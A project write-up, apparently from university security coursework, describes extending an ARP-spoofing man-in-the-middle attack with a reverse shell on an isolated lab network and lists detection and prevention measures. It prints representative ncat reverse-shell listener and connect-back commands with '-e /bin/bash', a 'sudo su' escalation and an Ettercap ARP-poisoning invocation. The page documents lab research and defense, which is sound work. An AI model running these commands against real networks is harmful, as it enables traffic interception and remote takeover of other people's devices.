Extending MiTM via reverse shells

With Deecon Precht · Information Security · Jul 2024

A local ARP-spoofing man-in-the-middle attack is confined to one network segment. This work, built with Deecon Precht on an isolated private network, shows how a reverse shell extends that reach past the segment it started on, and documents the traffic monitoring, firewall, and intrusion-detection measures that catch and stop it.

Attack-and-defense security research

Two-person Information Security research at Indiana University Southeast. It shows how a reverse shell turns a local ARP-spoofing attack into one that can reach past its own network, run entirely on an isolated private network, and covers the monitoring, firewall, and intrusion-detection work that defends against it.

Why it exists

Built with Deecon Precht on a private lab network we controlled end to end. A victim host, a router, and an attacker host, all on addresses we assigned ourselves.

A man-in-the-middle, or MiTM, attack is a third party sitting between two devices that believe they are talking directly to each other, able to read or change the traffic passing between them. That attack is normally stuck on one local network. The question was simple: could it be made to reach further, and what would actually catch it if it did.

Every device on a network answers to two addresses: an IP address, like a street address, and a MAC address, a fixed serial number built into its network hardware. ARP, the Address Resolution Protocol, is how a device finds the MAC address that goes with an IP address. It is the equivalent of calling out "who is at number 12" and trusting whoever answers back.

ARP spoofing abuses that trust. The attacker answers on another device's behalf, claiming its own MAC address belongs to the victim or the router, so traffic meant for one of them is sent to the attacker instead. This only works locally, on the same network segment as the devices being fooled, which is exactly the reach this work set out to extend.

Setting up and watching the lab, in plain terms

Three ordinary machines, not three mysteries. The whole lab was a handful of devices talking to each other and to one shared router, the same shape as a home Wi-Fi network. None of it touched the public internet.

Setting up the network. Every device got its own private address, the network equivalent of a house number on a street nobody outside the lab could even see.

One piece of router configuration, called port forwarding, told the router to send anything addressed to one specific door straight through to one device. It works like a receptionist with standing instructions to connect anyone who asks for a certain extension directly to one particular desk, instead of asking every caller who they are trying to reach. The lab opened two doors this way: one for the reverse shell, and one for the SSH connection used later to retrieve the capture file.

Scouting the network, or "reconnaissance." Security people call looking around before acting reconnaissance, "recon" for short. It just means finding out what is there before touching anything.

A tool called Nmap asked every address on the lab's little street, in turn, whether anyone was home and what they were running, and noted who answered. It is the digital version of walking a block, reading the house numbers, and noting which porch lights are on, all without knocking on a single door.

nmap · lab address range

$ nmap -sn 192.168.1.0/24

The ping-scan syntax from the report's own reconnaissance step: one request to each address in the range, nothing more.

Watching the traffic, or "network analysis." To prove the interception actually happened, rather than just assume it did, every piece of data moving through the lab was recorded with a tool called tcpdump, roughly a dashboard camera that records everything passing on a stretch of road.

That recording was played back afterward in Wireshark, filtered down by protocol to just the ARP traffic, the way you would skip straight to the few minutes of footage that actually show the car you are interested in. The recording, not just the attack appearing to work, is what confirmed the forged replies really arrived.

The recording had to reach the analysis machine before anyone could look at it, so it travelled over the second forwarded door: the SSH connection, the same encrypted channel used for a secure remote login, copied across with scp rather than emailed or carried over on a drive.

representative syntax, from the report

$ tcpdump -i wlan0 -w capture.pcap
$ scp kali@192.168.1.50:~/capture.pcap ./capture.pcap

The capture command and the file transfer, written the way the report gives them; not output captured from an actual run.

Extending the attack

A reverse shell flips the usual connection. Instead of an attacker connecting in to a target, the target machine opens an outbound connection back out to the attacker.

That one flip is what makes the extension possible. Outbound connections are what most firewalls are configured to allow, so a reverse shell tends to cross boundaries an inbound connection would not. It also survives a victim whose address changes, since the victim is the one reaching out to a fixed point rather than the other way around.

Getting that shell open still takes a first step somewhere else: a payload has to reach the victim's machine, commonly through phishing, an existing vulnerability, or social engineering, and then actually be run before any of what follows can happen.

Once that shell is open, the attacker is no longer limited to commands run from their own machine. They are running commands as the compromised device, on whatever network segments that device can reach.

That is the actual finding. A device compromised by a reverse shell can be made to carry out ARP spoofing of its own, against other devices on networks it connects to later. The initial, local attack effectively travels with the compromised device rather than staying put.

Ettercap did the ARP spoofing and MiTM interception. Netcat, which Kali packages alongside NMap rather than as its own install, run as ncat rather than nc for cross-platform compatibility, opened the reverse shell. MSFVenom generated the payload that triggers it, though a short script using a programming language's own networking libraries works the same way.

MSFVenom's payloads were not reliable in our testing, which is worth noting on its own. A textbook tool chain does not always behave like the textbook.

representative syntax, from the report

# Attacker: listen for the victim's connection
$ ncat -nlvp 4444 -e /bin/bash

# Victim: connect back out to the attacker
$ ncat 192.168.1.76 4444 -e /bin/bash

# Inside the shell: a regular account, then root
$ whoami
$ sudo su
$ whoami

# Ettercap, run from the now-compromised device
$ ettercap -T -S -i wlan0 -M arp:remote \
    /192.168.1.1// /192.168.1.50//

The listener, the connect-back, the privilege escalation that most of the rest needs, and the Ettercap invocation, written the way the report gives them; not output captured from an actual run.

We used tcpdump to capture the attack traffic and Wireshark to read it back afterward, which is how the interception was actually verified rather than assumed.

The commands above are representative syntax, not a copy-paste reproduction. The report's own version ties each one to this lab's specific devices and adds a step that pulls a saved Wi-Fi password out of the victim's own network configuration; that step, and the full tied-together sequence, stay out of this page and are available on request instead.

Detection and prevention

Every attack here has a defense documented beside it, because the point was to understand both sides.

Against ARP spoofing: strong, unique device and account passwords; WPA2/WPA3 encryption on Wi-Fi networks; minimizing broadcasted handshake traffic; and restricting port forwarding to what is actually needed, since an open port is an open door regardless of what else is secured.

Against the reverse shell: traffic analysis for unusual outbound connections to unfamiliar hosts or ports; firewall rules that restrict outbound traffic rather than only inbound; endpoint protection that can recognize and block a reverse shell payload before it runs; and an intrusion detection system to flag the pattern even when the payload itself is novel.

Network-wide, the same monitoring and firewall discipline is reinforced by DNSSEC against DNS spoofing, key-based SSH authentication in place of passwords with brute-force protection such as fail2ban behind it, systems kept patched against known vulnerabilities, and routine scanning for the kind of remote-access trojans a reverse shell is a form of. None of these measures requires knowing an attack is coming; they are what makes an attack visible, or impossible, if one does.
